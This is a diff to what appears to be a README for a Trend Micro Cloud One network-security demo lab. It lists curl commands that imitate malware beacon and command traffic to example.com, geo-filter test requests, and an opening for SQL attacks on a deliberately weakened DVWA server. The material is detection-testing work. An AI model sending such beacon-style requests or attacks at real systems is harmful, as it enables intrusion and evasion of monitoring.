@@ -61,3 +61,18 @@ Below is the list of outbound attacks you can perform from your Wordpress WebSer
 | 25492      | curl -H 'User-Agent: sdvntyer' http://www.example.com/api/v88 |
 | 34738      | curl 'http://www.example.com/includes/main.php?t=7d4580a3910c54d62b46f24c397c8d59&f=g2&type=cmd&id=D7CB4B6E5A21CA596DE0A7E10059C85E'|
 | 38451      | curl -H 'User-Agent: ArcherGhost' -d 'post=eyJkYXRhIjogeyJkb21haW4iOiAiaHR0cDovL3RhcmdldDEyMy5jb20vYXNzZXRzL3ZlbmRvci9waHB1bml0L3BocHVuaXQvc3JjL1V0aWwvUEhQL3Nzc3AucGhwIiwgInNlcnZlciI6ICIxOTIuMTY4LjEwNy4xOSIsICJ0aXRsZSI6ICJqcSJ9LCAidHlwZSI6ICJzY2FubmVyIn0%3D' http://www.example.com/adeliap/404.php |
+
+### Geo Filter Attacks
+
+In order to perform Geo Filter attacks, you need to first configure Geo Filters in Cloud One console by selecting a geographic region to block traffic. For detailed steps on how to configure Geo Filters, please check [Geolocation Filter](https://cloudone.trendmicro.com/docs/network-security/Geo_Location_filtering/). 
+
+Below is the list of geofilter attacks you can perform from your Wordpress WebServer. You will need to SSH into the webserver instance via Bastion Host that is created as part of the Quick Start setup.
+
+| Region | Attack |
+| :----- | :----------------------|
+| China  | curl https://baidu.com |
+| Russia | curl https://mail.ru   |
+
+### SQL Attacks
+
+SQL Attacks can be performed on DVWA server that is spun up as part of the Quick Start. For performing SQL Attacks, you need to first configure the application security level to "Low" in order for attacks to work properly.
